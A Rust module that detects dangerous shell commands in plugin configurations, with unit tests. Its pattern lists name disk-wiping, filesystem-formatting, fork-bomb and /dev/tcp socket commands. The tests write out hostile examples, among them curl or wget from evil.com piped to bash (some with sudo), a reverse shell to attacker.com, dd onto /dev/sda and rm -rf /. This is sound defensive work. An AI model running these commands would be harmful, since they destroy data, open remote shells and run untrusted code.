//! Dangerous command pattern detection for plugin configuration validation.
//!
//! Controller-side detection of potentially dangerous patterns in shell
//! commands stored in plugin configs.
//!
//! This module only detects patterns and returns matches. Policy decisions
//! (reject vs allow) and semantic audit emission are handled by web API route
//! handlers.

/// Simple substring patterns with human-readable descriptions.
///
/// Matching is case-insensitive on the command string.
const DANGEROUS_PATTERNS: &[(&str, &str)] = &[
    ("dd if=", "raw disk write"),
    ("mkfs.", "filesystem format"),
    (":(){ :|:& };:", "fork bomb"),
    ("/dev/tcp/", "bash network socket"),
    ("/dev/udp/", "bash network socket"),
    ("> /dev/sda", "raw disk overwrite"),
    ("mv /* /dev/null", "destructive move to null"),
];

/// Patterns that need end-of-string or wildcard boundary matching.
///
/// The pattern must appear at the end of the command or be followed by
/// whitespace or `*`.
const BOUNDARY_PATTERNS: &[(&str, &str)] = &[
    ("rm -rf /", "recursive delete from root"),
    ("chmod 777 /", "recursive world-writable root"),
];

/// Shell interpreters that, when piped to, indicate remote code execution.
const PIPE_TO_SHELL_TARGETS: &[&str] = &["bash", "sh", "zsh", "dash"];

/// Download commands whose output piped to a shell is dangerous.
const PIPE_FROM_DOWNLOADERS: &[&str] = &["curl", "wget"];

/// Command prefixes that can wrap a shell interpreter (e.g. `sudo bash`, `env sh`).
const PIPE_SHELL_PREFIXES: &[&str] = &["sudo", "env", "doas", "run0"];

/// Detect dangerous patterns in a command string.
///
/// Returns a list of `(pattern, description)` for each match found.
/// Matching is case-insensitive. An empty return means no patterns matched.
pub fn detect_dangerous_patterns(command: &str) -> Vec<(&'static str, &'static str)> {
    let lower = command.to_lowercase();
    let mut matches: Vec<(&str, &str)> = DANGEROUS_PATTERNS
        .iter()
        .filter(|(pattern, _)| lower.contains(*pattern))
        .copied()
        .collect();

    // Boundary patterns: must be at end of string or followed by whitespace/*
    for &(pattern, desc) in BOUNDARY_PATTERNS {
        if let Some(pos) = lower.find(pattern) {
            let after = pos + pattern.len();
            if after >= lower.len() {
                matches.push((pattern, desc));
            } else {
                let next_char = lower.as_bytes()[after];
                if next_char == b'*' || next_char == b' ' || next_char == b'\n' {
                    matches.push((pattern, desc));
                }
            }
        }
    }

    // Pipe-to-shell detection: `<downloader> ... | [sudo|env|doas|run0] [-flags] <shell>`
    // Check if the command pipes output from a download tool to a shell interpreter,
    // including cases where the shell is wrapped by sudo, env, doas, or run0.
    if lower.contains('|') {
        let has_downloader = PIPE_FROM_DOWNLOADERS.iter().any(|dl| lower.contains(*dl));
        let pipe_segments: Vec<&str> = lower.split('|').collect();
        if has_downloader && pipe_segments.len() >= 2 {
            'segments: for segment in &pipe_segments[1..] {
                let trimmed = segment.trim();
                // Skip prefix wrappers (sudo, env, doas, run0) and flags (words starting with -)
                // to find the actual command being invoked.
                let effective_cmd = trimmed
                    .split_whitespace()
                    .find(|w| !w.starts_with('-') && !PIPE_SHELL_PREFIXES.contains(w))
                    .unwrap_or("");
                if PIPE_TO_SHELL_TARGETS.contains(&effective_cmd) {
                    matches.push(("curl|bash", "pipe remote script to shell"));
                    break 'segments;
                }
            }
        }
    }

    matches
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detect_curl_pipe_bash() {
        let matches = detect_dangerous_patterns("curl https://evil.com/script.sh | bash");
        assert!(!matches.is_empty());
        assert!(
            matches
                .iter()
                .any(|(_, desc)| desc.contains("remote script"))
        );
    }

    #[test]
    fn detect_curl_pipe_bash_no_spaces() {
        let matches = detect_dangerous_patterns("curl https://evil.com/script.sh|bash");
        assert!(!matches.is_empty());
    }

    #[test]
    fn detect_wget_pipe_sh() {
        let matches = detect_dangerous_patterns("wget -qO- https://evil.com/install.sh | sh -s --");
        assert!(!matches.is_empty());
        assert!(
            matches
                .iter()
                .any(|(_, desc)| desc.contains("remote script"))
        );
    }

    #[test]
    fn detect_rm_rf_root() {
        let matches = detect_dangerous_patterns("rm -rf /");
        assert!(!matches.is_empty());
        assert!(
            matches
                .iter()
                .any(|(_, desc)| desc.contains("recursive delete"))
        );
    }

    #[test]
    fn detect_rm_rf_root_wildcard() {
        let matches = detect_dangerous_patterns("rm -rf /*");
        assert!(!matches.is_empty());
    }

    #[test]
    fn detect_dd_if() {
        let matches = detect_dangerous_patterns("dd if=/dev/zero of=/dev/sda bs=1M");
        assert!(matches.iter().any(|(_, desc)| desc.contains("raw disk")));
    }

    #[test]
    fn detect_fork_bomb() {
        let matches = detect_dangerous_patterns(":(){ :|:& };:");
        assert!(!matches.is_empty());
        assert!(matches.iter().any(|(_, desc)| desc.contains("fork bomb")));
    }

    #[test]
    fn detect_dev_tcp() {
        let matches = detect_dangerous_patterns("bash -i >& /dev/tcp/attacker.com/4444 0>&1");
        assert!(!matches.is_empty());
        assert!(
            matches
                .iter()
                .any(|(_, desc)| desc.contains("network socket"))
        );
    }

    #[test]
    fn benign_command_no_matches() {
        let matches = detect_dangerous_patterns("apt-get install -y nginx");
        assert!(matches.is_empty());
    }

    #[test]
    fn benign_curl_without_pipe() {
        let matches = detect_dangerous_patterns(
            "curl -sSL https://example.com/file.tar.gz -o /tmp/file.tar.gz",
        );
        assert!(matches.is_empty());
    }

    #[test]
    fn benign_systemctl_restart() {
        let matches = detect_dangerous_patterns("systemctl restart myapp");
        assert!(matches.is_empty());
    }

    #[test]
    fn case_insensitive_detection() {
        let matches = detect_dangerous_patterns("CURL https://evil.com/script.sh | BASH");
        assert!(!matches.is_empty());
    }

    #[test]
    fn rm_rf_specific_dir_not_matched() {
        let matches = detect_dangerous_patterns("rm -rf /tmp/build-artifacts");
        assert!(matches.is_empty());
    }

    #[test]
    fn rm_rf_with_trailing_path_not_matched() {
        let matches = detect_dangerous_patterns("rm -rf /var/log/old/");
        assert!(matches.is_empty());
    }

    #[test]
    fn curl_pipe_to_grep_not_matched() {
        let matches = detect_dangerous_patterns("curl -s https://api.example.com | grep version");
        assert!(matches.is_empty());
    }

    #[test]
    fn detect_curl_pipe_sudo_bash() {
        let matches = detect_dangerous_patterns("curl https://evil.com/install.sh | sudo bash");
        assert!(!matches.is_empty());
        assert!(
            matches
                .iter()
                .any(|(_, desc)| desc.contains("remote script"))
        );
    }

    #[test]
    fn detect_wget_pipe_env_sh() {
        let matches = detect_dangerous_patterns("wget -qO- https://evil.com/install.sh | env sh");
        assert!(!matches.is_empty());
        assert!(
            matches
                .iter()
                .any(|(_, desc)| desc.contains("remote script"))
        );
    }

    #[test]
    fn detect_curl_pipe_env_i_bash() {
        let matches = detect_dangerous_patterns("curl https://evil.com/install.sh | env -i bash");
        assert!(!matches.is_empty());
        assert!(
            matches
                .iter()
                .any(|(_, desc)| desc.contains("remote script"))
        );
    }

    #[test]
    fn detect_curl_pipe_doas_sh() {
        let matches = detect_dangerous_patterns("curl https://evil.com/install.sh | doas sh");
        assert!(!matches.is_empty());
    }
}
